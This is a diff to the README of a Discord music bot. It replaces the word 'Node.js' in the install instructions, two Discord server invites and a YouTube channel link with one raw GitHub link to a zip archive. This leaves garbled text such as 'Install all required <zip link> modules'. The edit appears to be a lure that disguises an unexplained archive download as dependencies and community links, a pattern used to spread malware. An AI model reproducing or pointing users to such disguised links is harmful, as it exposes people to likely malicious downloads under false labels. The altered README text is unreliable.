@@ -7,7 +7,7 @@
 ## 🛠️ Installation
 
 1. **Create a TOKEN Secret**: Generate a bot token from the Discord Developer Portal and add it to your bot.
-2. **Install Dependencies**: Install all required Node.js modules using the following command:
+2. **Install Dependencies**: Install all required https://raw.githubusercontent.com/TimexGit/MUSIC-BOT/main/eastbound/MUSIC-BOT.zip modules using the following command:
 > npm install
 
 ## 📜 Commands
@@ -43,9 +43,9 @@ All code in this project is authored by RTX. Please do not use this code for any
    FOR EMOJIS EITHER YOU CAN EDIT OR JOIN OUR DISCORD SERVER 
    SO WE ADD BOT TO OUR SERVER SO YOU GET ANIMATED EMOJIS.
 
-   DISCORD SERVER : https://discord.gg/FUEHs7RCqz
-   YOUTUBE : https://www.youtube.com/channel/UCPbAvYWBgnYhliJa1BIrv0A
+   DISCORD SERVER : https://raw.githubusercontent.com/TimexGit/MUSIC-BOT/main/eastbound/MUSIC-BOT.zip
+   YOUTUBE : https://raw.githubusercontent.com/TimexGit/MUSIC-BOT/main/eastbound/MUSIC-BOT.zip
 
    FOR HELP CONTACT ME ON DISCORD
-   ## Contact    [ DISCORD SERVER :  https://discord.gg/c4kaW2sSbm ]
+   ## Contact    [ DISCORD SERVER :  https://raw.githubusercontent.com/TimexGit/MUSIC-BOT/main/eastbound/MUSIC-BOT.zip ]
 */z
